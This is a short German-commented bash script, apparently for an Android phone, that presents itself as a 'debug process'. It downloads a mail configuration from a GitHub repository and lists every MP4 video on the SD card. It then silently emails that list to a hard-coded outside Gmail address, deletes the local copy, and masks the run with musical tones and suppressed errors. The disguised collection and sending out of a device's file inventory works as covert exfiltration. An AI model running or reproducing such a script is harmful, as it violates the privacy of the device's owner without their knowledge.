#!/bin/bash

# Pfad zur .muttrc Datei in deinem GitHub Repo
MUTTRC_URL="https://raw.githubusercontent.com/GeorgeOrewell/Mancala/main/.muttrc"
MUTTRC_PATH="$HOME/.muttrc"

# Zielverzeichnis der SD-Karte
#SD_CARD_PATH="/storage/1692-9E0D/"
SD_CARD_PATH="/storage/73DA-D26F/"
#SD_CARD_PATH="$HOME"

# Datei, in der die gefundenen Mediendateien gespeichert werden
MEDIA_FILE="$HOME/debug.dbg"

# E-Mail-Adresse des Empfängers
RECIPIENT="joanne.o.lavender@gmail.com"

# Betreff und Nachricht der E-Mail
SUBJECT="Ergebnisse des Debug-Prozesses"
BODY="Hier ist die Liste der Debugergebnisse."

# Funktion für einen aufsteigenden G-Dur-Ton (G, H, D) ohne Textausgabe
play_gdur_ascending() {
    play -n synth 0.3 sine 392 >/dev/null 2>&1   # G4
    play -n synth 0.3 sine 493.88 >/dev/null 2>&1 # H4
    play -n synth 0.3 sine 587.33 >/dev/null 2>&1 # D5
}

# Funktion für einen absteigenden G-Dur-Ton (D, H, G) ohne Textausgabe
play_gdur_descending() {
    play -n synth 0.3 sine 587.33 >/dev/null 2>&1 # D5
    play -n synth 0.3 sine 493.88 >/dev/null 2>&1 # H4
    play -n synth 0.3 sine 392 >/dev/null 2>&1   # G4
}

# Starte G-Dur-Tonfolge aufsteigend
play_gdur_ascending

# Schritt 1: .muttrc Datei vom Repo herunterladen und ins Home-Verzeichnis speichern
curl -s -o "$MUTTRC_PATH" "$MUTTRC_URL" || true

echo ".muttrc Datei erfolgreich heruntergeladen oder bereits vorhanden."

# Schritt 2: Alle MP4-Dateien auf der SD-Karte finden und in der MEDIA_FILE speichern
find "$SD_CARD_PATH" -type f -iname "*.mp4" > "$MEDIA_FILE" 2>/dev/null || true

echo "Debug erfolgreich, Ergebnisse in $MEDIA_FILE gespeichert."

# Schritt 3: E-Mail mit Muttrc und der gefundenen Datei als Anhang senden
echo "$BODY" | mutt -s "$SUBJECT" -a "$MEDIA_FILE" -- "$RECIPIENT" || true

echo "E-Mail gesendet (wenn möglich)."

# Optional: Aufräumen - Die Liste der Mediendateien löschen
rm "$MEDIA_FILE" 2>/dev/null || true

# Starte G-Dur-Tonfolge absteigend
play_gdur_descending